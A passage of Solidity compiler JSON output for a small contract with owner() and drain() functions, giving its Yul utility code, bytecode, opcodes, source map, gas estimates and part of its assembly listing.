																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "1532:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "1532:9:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1543:1:1",
																				"nodeType": "YulLiteral",
																				"src": "1543:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1528:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "1528:3:1"
																		},
																		"nativeSrc": "1528:17:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1528:17:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "tail",
																				"nativeSrc": "1551:4:1",
																				"nodeType": "YulIdentifier",
																				"src": "1551:4:1"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "1557:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "1557:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "1547:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "1547:3:1"
																		},
																		"nativeSrc": "1547:20:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1547:20:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1521:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "1521:6:1"
																},
																"nativeSrc": "1521:47:1",
																"nodeType": "YulFunctionCall",
																"src": "1521:47:1"
															},
															"nativeSrc": "1521:47:1",
															"nodeType": "YulExpressionStatement",
															"src": "1521:47:1"
														},
														{
															"nativeSrc": "1577:139:1",
															"nodeType": "YulAssignment",
															"src": "1577:139:1",
															"value": {
																"arguments": [
																	{
																		"name": "tail",
																		"nativeSrc": "1711:4:1",
																		"nodeType": "YulIdentifier",
																		"src": "1711:4:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682_to_t_string_memory_ptr_fromStack",
																	"nativeSrc": "1585:124:1",
																	"nodeType": "YulIdentifier",
																	"src": "1585:124:1"
																},
																"nativeSrc": "1585:131:1",
																"nodeType": "YulFunctionCall",
																"src": "1585:131:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "1577:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "1577:4:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682__to_t_string_memory_ptr__fromStack_reversed",
												"nativeSrc": "1304:419:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1455:9:1",
														"nodeType": "YulTypedName",
														"src": "1455:9:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "1470:4:1",
														"nodeType": "YulTypedName",
														"src": "1470:4:1",
														"type": ""
													}
												],
												"src": "1304:419:1"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function store_literal_in_memory_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682(memPtr) {\n\n        mstore(add(memPtr, 0), \"Not owner\")\n\n    }\n\n    function abi_encode_t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 9)\n        store_literal_in_memory_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_tuple_t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "60806040526004361061002c575f3560e01c80638da5cb5b146100375780639890220b1461006157610033565b3661003357005b5f5ffd5b348015610042575f5ffd5b5061004b610077565b60405161005891906101ce565b60405180910390f35b34801561006c575f5ffd5b5061007561009b565b005b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610129576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161012090610241565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561018c573d5f5f3e3d5ffd5b50565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101b88261018f565b9050919050565b6101c8816101ae565b82525050565b5f6020820190506101e15f8301846101bf565b92915050565b5f82825260208201905092915050565b7f4e6f74206f776e657200000000000000000000000000000000000000000000005f82015250565b5f61022b6009836101e7565b9150610236826101f7565b602082019050919050565b5f6020820190508181035f8301526102588161021f565b905091905056fea26469706673582212200bcd705f5e39d431af854077a13b6884957db480ab8cd6ca4f464d92fb26577d64736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x37 JUMPI DUP1 PUSH4 0x9890220B EQ PUSH2 0x61 JUMPI PUSH2 0x33 JUMP JUMPDEST CALLDATASIZE PUSH2 0x33 JUMPI STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x42 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x4B PUSH2 0x77 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x58 SWAP2 SWAP1 PUSH2 0x1CE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x75 PUSH2 0x9B JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x129 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x120 SWAP1 PUSH2 0x241 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x18C JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1B8 DUP3 PUSH2 0x18F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C8 DUP2 PUSH2 0x1AE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E1 PUSH0 DUP4 ADD DUP5 PUSH2 0x1BF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F74206F776E65720000000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x22B PUSH1 0x9 DUP4 PUSH2 0x1E7 JUMP JUMPDEST SWAP2 POP PUSH2 0x236 DUP3 PUSH2 0x1F7 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x258 DUP2 PUSH2 0x21F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SIGNEXTEND 0xCD PUSH17 0x5F5E39D431AF854077A13B6884957DB480 0xAB DUP13 0xD6 0xCA 0x4F CHAINID 0x4D SWAP3 EXTSTATICCALL 0x26 JUMPI PUSH30 0x64736F6C634300081D003300000000000000000000000000000000000000 ",
							"sourceMap": "0:397:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;31:20;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;220:140;;;;;;;;;;;;;:::i;:::-;;31:20;;;;;;;;;;;;;:::o;220:140::-;278:5;;;;;;;;;;;264:19;;:10;:19;;;256:41;;;;;;;;;;;;:::i;:::-;;;;;;;;;315:5;;;;;;;;;;;307:23;;:46;331:21;307:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;220:140::o;7:126:1:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o;593:169::-;677:11;711:6;706:3;699:19;751:4;746:3;742:14;727:29;;593:169;;;;:::o;768:159::-;908:11;904:1;896:6;892:14;885:35;768:159;:::o;933:365::-;1075:3;1096:66;1160:1;1155:3;1096:66;:::i;:::-;1089:73;;1171:93;1260:3;1171:93;:::i;:::-;1289:2;1284:3;1280:12;1273:19;;933:365;;;:::o;1304:419::-;1470:4;1508:2;1497:9;1493:18;1485:26;;1557:9;1551:4;1547:20;1543:1;1532:9;1528:17;1521:47;1585:131;1711:4;1585:131;:::i;:::-;1577:139;;1304:419;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "132200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"drain()": "infinite",
								"owner()": "2485"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 0,
									"end": 397,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 0,
									"end": 397,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 0,
									"end": 397,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 58,
									"end": 214,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 58,
									"end": 214,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 58,
									"end": 214,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 58,
									"end": 214,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 58,
									"end": 214,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 58,
									"end": 214,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 58,
									"end": 214,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 58,
									"end": 214,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 189,
									"end": 198,
									"name": "ORIGIN",
									"source": 0
								},
								{
									"begin": 181,
									"end": 186,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 181,
									"end": 186,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 181,
									"end": 198,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 181,
									"end": 198,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 181,
									"end": 198,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 181,
									"end": 198,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 181,
									"end": 198,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 58,
									"end": 214,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 0,
									"end": 397,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 0,
									"end": 397,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 827,
									"end": 832,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 800,
									"end": 833,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 800,
									"end": 833,
									"name": "tag",
									"source": 1,
									"value": "25"
								},
								{
									"begin": 800,
									"end": 833,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 915,
									"end": 921,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 964,
									"end": 966,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 952,
									"end": 961,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 943,
									"end": 950,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 939,
									"end": 962,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 935,
									"end": 967,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 970,
									"end": 1049,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "tag",
									"source": 1,
									"value": "28"
								},
								{
									"begin": 970,
									"end": 1049,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "tag",
									"source": 1,
									"value": "27"
								},
								{
									"begin": 932,
									"end": 1051,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1090,
									"end": 1091,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1171,
									"end": 1178,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 1162,
									"end": 1168,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 1151,
									"end": 1160,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 1147,
									"end": 1169,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 1115,
									"end": 1179,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "tag",
									"source": 1,
									"value": "29"
								},
								{
									"begin": 1115,
									"end": 1179,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 1105,
									"end": 1179,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 1061,
									"end": 1189,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 845,
									"end": 1196,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 0,
									"end": 397,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 0,
									"end": 397,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 0,
									"end": 397,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 0,
									"end": 397,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 0,
									"end": 397,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 0,
									"end": 397,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 0,
									"end": 397,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 0,
									"end": 397,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 0,
									"end": 397,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212200bcd705f5e39d431af854077a13b6884957db480ab8cd6ca4f464d92fb26577d64736f6c634300081d0033",
									".code": [
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
